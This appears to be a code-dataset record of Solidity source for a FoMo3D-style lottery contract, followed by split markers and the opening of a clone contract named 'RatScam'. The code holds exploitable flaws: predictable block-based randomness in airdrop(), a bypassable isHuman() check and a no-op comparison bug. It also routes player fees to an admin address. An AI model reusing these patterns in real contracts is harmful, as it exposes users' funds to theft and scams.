_eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                   uint256 _rID = rID_;                             uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && round_[_rID].eth != 0 && _now <= round_[_rID].end)            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else if (_now <= round_[_rID].end)              return ( ((round_[_rID].ico.keys()).add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 100000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now <= round_[_rID].strt + rndGap_)            return( ((round_[_rID].end).sub(rndInit_)).sub(_now) );        else             if (_now < round_[_rID].end)                return( (round_[_rID].end).sub(_now) );            else                return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                         if (now > round_[_rID].end && round_[_rID].ended == false)        {            uint256 _roundMask;            uint256 _roundEth;            uint256 _roundKeys;            uint256 _roundPot;            if (round_[_rID].eth == 0 && round_[_rID].ico > 0)            {                                 _roundEth = round_[_rID].ico;                                                 _roundKeys = (round_[_rID].ico).keys();                                                 _roundMask = ((round_[_rID].icoGen).mul(1000000000000000000)) / _roundKeys;                                                 _roundPot = (round_[_rID].pot).add((round_[_rID].icoGen).sub((_roundMask.mul(_roundKeys)) / (1000000000000000000)));            } else {                _roundEth = round_[_rID].eth;                _roundKeys = round_[_rID].keys;                _roundMask = round_[_rID].mask;                _roundPot = round_[_rID].pot;            }                        uint256 _playerKeys;            if (plyrRnds_[_pID][plyr_[_pID].lrnd].ico == 0)                _playerKeys = plyrRnds_[_pID][plyr_[_pID].lrnd].keys;            else                _playerKeys = calcPlayerICOPhaseKeys(_pID, _rID);                                     if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( (_roundPot.mul(48)) / 100 ),                    (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _roundMask, _roundPot, _roundKeys, _playerKeys) ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                       (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _roundMask, _roundPot, _roundKeys, _playerKeys) ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID, uint256 _roundMask, uint256 _roundPot, uint256 _roundKeys, uint256 _playerKeys)        private        view        returns(uint256)    {        return(  (((_roundMask.add((((_roundPot.mul(potSplit_[round_[rID_].team].gen)) / 100).mul(1000000000000000000)) / _roundKeys)).mul(_playerKeys)) / 1000000000000000000).sub(plyrRnds_[_pID][rID_].mask)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (round_[_rID].eth != 0)        {            return            (                round_[_rID].ico,                                _rID,                                            round_[_rID].keys,                               round_[_rID].end,                                round_[_rID].strt,                               round_[_rID].pot,                                (round_[_rID].team + (round_[_rID].plyr * 10)),                      plyr_[round_[_rID].plyr].addr,                   plyr_[round_[_rID].plyr].name,                   rndTmEth_[_rID][0],                              rndTmEth_[_rID][1],                              rndTmEth_[_rID][2],                              rndTmEth_[_rID][3],                              airDropTracker_ + (airDropPot_ * 1000)                           );        } else {            return            (                round_[_rID].ico,                                _rID,                                            (round_[_rID].ico).keys(),                       round_[_rID].end,                                round_[_rID].strt,                               round_[_rID].pot,                                (round_[_rID].team + (round_[_rID].plyr * 10)),                      plyr_[round_[_rID].plyr].addr,                   plyr_[round_[_rID].plyr].name,                   rndTmEth_[_rID][0],                              rndTmEth_[_rID][1],                              rndTmEth_[_rID][2],                              rndTmEth_[_rID][3],                              airDropTracker_ + (airDropPot_ * 1000)                           );        }    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                if (plyrRnds_[_pID][_rID].ico == 0)        {            return            (                _pID,                                                plyr_[_pID].name,                                    plyrRnds_[_pID][_rID].keys,                          plyr_[_pID].win,                                     (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                        plyr_[_pID].aff,                     				0						                         );        } else {            return            (                _pID,                                                plyr_[_pID].name,                                    calcPlayerICOPhaseKeys(_pID, _rID),                  plyr_[_pID].win,                                     (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                        plyr_[_pID].aff,                     				plyrRnds_[_pID][_rID].ico                        );        }            }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 _eventData_ = manageRoundAndPlayer(_pID, _eventData_);                         if (now <= round_[rID_].strt + rndGap_)         {                         _eventData_.compressedData = _eventData_.compressedData + 2000000000000000000000000000000;                                 icoPhaseCore(_pID, msg.value, _team, _affID, _eventData_);                                 } else {                          _eventData_.compressedData = _eventData_.compressedData + 1000000000000000000000000000000;                                 core(_pID, msg.value, _affID, _team, _eventData_);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private     {                 _eventData_ = manageRoundAndPlayer(_pID, _eventData_);                                           plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                 if (now <= round_[rID_].strt + rndGap_)         {                         _eventData_.compressedData = _eventData_.compressedData + 3000000000000000000000000000000;                                         icoPhaseCore(_pID, _eth, _team, _affID, _eventData_);                 } else {                         core(_pID, _eth, _affID, _team, _eventData_);        }    }                 function icoPhaseCore(uint256 _pID, uint256 _eth, uint256 _team, uint256 _affID, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         if ((round_[_rID].ico).keysRec(_eth) >= 1000000000000000000 || round_[_rID].plyr == 0)        {                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;              if (round_[_rID].team != _team)                round_[_rID].team = _team;                                     _eventData_.compressedData = _eventData_.compressedData + 100;        }                                  plyrRnds_[_pID][_rID].ico = _eth.add(plyrRnds_[_pID][_rID].ico);        round_[_rID].ico = _eth.add(round_[_rID].ico);                         rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);                         uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                                  round_[_rID].icoGen = _gen.add(round_[_rID].icoGen);        		         uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                         uint256 _pot = (_eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100))).sub(_gen);                         round_[_rID].pot = _pot.add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                         endTx(_rID, _pID, _team, _eth, 0, _eventData_);    }             function core(uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         if (round_[_rID].eth == 0 && round_[_rID].ico > 0)            roundClaimICOKeys(_rID);                         if (plyrRnds_[_pID][_rID].keys == 0 && plyrRnds_[_pID][_rID].ico > 0)        {                         plyrRnds_[_pID][_rID].keys = calcPlayerICOPhaseKeys(_pID, _rID);                         plyrRnds_[_pID][_rID].ico = 0;        }                             uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)        {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;              if (round_[_rID].team != _team)                round_[_rID].team = _team;                                      _eventData_.compressedData = _eventData_.compressedData + 100;        }                         if (_eth >= 100000000000000000)        {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                 {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 100000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                 airDropTracker_ = 0;            }        }                 _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);                         round_[_rID].keys = _keys.add(round_[_rID].keys);        round_[_rID].eth = _eth.add(round_[_rID].eth);        rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                 _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);        _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                         endTx(_rID, _pID, _team, _eth, _keys, _eventData_);    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {                          if (plyrRnds_[_pID][_rIDlast].ico == 0)            return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );        else            if (now > round_[_rIDlast].strt + rndGap_ && round_[_rIDlast].eth == 0)                return(  (((((round_[_rIDlast].icoGen).mul(1000000000000000000)) / (round_[_rIDlast].ico).keys()).mul(calcPlayerICOPhaseKeys(_pID, _rIDlast))) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );            else                return(  (((round_[_rIDlast].mask).mul(calcPlayerICOPhaseKeys(_pID, _rIDlast))) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );                               }             function calcAverageICOPhaseKeyPrice(uint256 _rID)        public         view         returns(uint256)    {        return(  (round_[_rID].ico).mul(1000000000000000000) / (round_[_rID].ico).keys()  );    }             function calcPlayerICOPhaseKeys(uint256 _pID, uint256 _rID)        public         view        returns(uint256)    {        if (round_[_rID].icoAvg != 0 || round_[_rID].ico == 0 )            return(  ((plyrRnds_[_pID][_rID].ico).mul(1000000000000000000)) / round_[_rID].icoAvg  );        else            return(  ((plyrRnds_[_pID][_rID].ico).mul(1000000000000000000)) / calcAverageICOPhaseKeyPrice(_rID)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && round_[_rID].eth != 0 && _now <= round_[_rID].end)            return ( (round_[_rID].eth).keysRec(_eth) );        else if (_now <= round_[_rID].end)              return ( (round_[_rID].ico).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && round_[_rID].eth != 0 && _now <= round_[_rID].end)            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else if (_now <= round_[_rID].end)              return ( (((round_[_rID].ico).keys()).add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                   function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }             function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }             function manageRoundAndPlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                         uint256 _now = now;                                  if (_now > round_[_rID].end)        {                         if (round_[_rID].ended == false)            {                _eventData_ = endRound(_eventData_);                round_[_rID].ended = true;            }                                     rID_++;            _rID++;            round_[_rID].strt = _now;            round_[_rID].end = _now.add(rndInit_).add(rndGap_);        }                         if (plyr_[_pID].lrnd != _rID)        {                                      if (plyr_[_pID].lrnd != 0)                updateGenVault(_pID, plyr_[_pID].lrnd);                                     plyr_[_pID].lrnd = _rID;                                     _eventData_.compressedData = _eventData_.compressedData + 10;        }                return(_eventData_);    }             function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                         if (round_[_rID].eth == 0 && round_[_rID].ico > 0)            roundClaimICOKeys(_rID);                         uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                         uint256 _pot = round_[_rID].pot;                                  uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                         plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                         admin.transfer(_p3d.add(_com));                             round_[_rID].mask = _ppt.add(round_[_rID].mask);                                     round_[_rID + 1].pot += _res;                         _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                return(_eventData_);    }             function roundClaimICOKeys(uint256 _rID)        private    {                 round_[_rID].eth = round_[_rID].ico;                                 round_[_rID].keys = (round_[_rID].ico).keys();                         round_[_rID].icoAvg = calcAverageICOPhaseKeyPrice(_rID);                                 uint256 _ppt = ((round_[_rID].icoGen).mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = (round_[_rID].icoGen).sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000));        if (_dust > 0)            round_[_rID].pot = (_dust).add(round_[_rID].pot);                                     round_[_rID].mask = _ppt.add(round_[_rID].mask);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                         uint256 _now = now;                         if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _com = _eth / 50;        uint256 _p3d;        if (!address(admin).call.value(_com)())        {                                                                                          _p3d = _com;            _com = 0;        }                         uint256 _long = _eth / 100;        admin.transfer(_long);                         uint256 _aff = _eth / 10;                                  if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _aff;        }                         _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                         admin.transfer(_p3d);                                     _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }                return(_eventData_);    }        function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;                round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }             function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                         _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                         uint256 _pot = _eth.sub(_gen);                                  uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                         return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _rID, uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (_rID * 10000000000000000000000000000000000000000000000000000);                emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin);                 require(activated_ == false, "fomo3d already activated");                         activated_ = true;                 		rID_ = 1;        round_[1].strt = now;        round_[1].end = now + rndInit_ + rndGap_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcFast {    using SafeMath for *;             function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(200000000000000000000000000000000)).add(2500000000000000000000000000000000000000000000000000000000000000)).sqrt()).sub(50000000000000000000000000000000)) / (100000000000000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((50000000000000).mul(_keys.sq()).add(((100000000000000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface DiviesInterface {    function deposit() external payable;}interface JIincForwarderInterface {    function deposit() external payable returns(bool);    function status() external view returns(address, address, bool);    function startMigration(address _newCorpBank) external returns(bool);    function cancelMigration() external returns(bool);    function finishMigration() external returns(bool);    function setup(address _firstCorpBank) external;}interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {             function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract modularRatScam is RSEvents {}
0<CODESPLIT>contract RatScam is modularRatScam {    using SafeMath for *;    using NameFilter for string;    using RSKeysCalc for uint256;         address constant private adminAddress = 0xFAdb9139a33a4F2FE67D340B6AAef0d04E9D5681;    RatBookInterface constant private RatBook = RatBookInterface(0x3257d637b8977781b4f8178365858a474b2a6195);    string constant public name = "RatScam In One Hour";    string constant public symbol = "RS";    uint256 private rndGap_ = 0;         uint256 constant private rndInit_ = 1 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 1 hours;                                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;                        mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => RSdatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => RSdatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;                          mapping (uint256 => RSdatasets.Round) public round_;                       uint256 public fees_ = 60;               uint256 public potSplit_ = 45;                              constructor()    public    {    }                             modifier isActivated() {        require(activated_ == true, "its not ready yet");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "non smart contract address only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "too little money");        require(_eth <= 100000000000000000000000, "too much money");        _;    }                             function()    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, _eventData_);    }         function buyXid(uint256 _affCode)    isActivated()    isHuman()    isWithinLimits(msg.value)    public    payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                     } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = 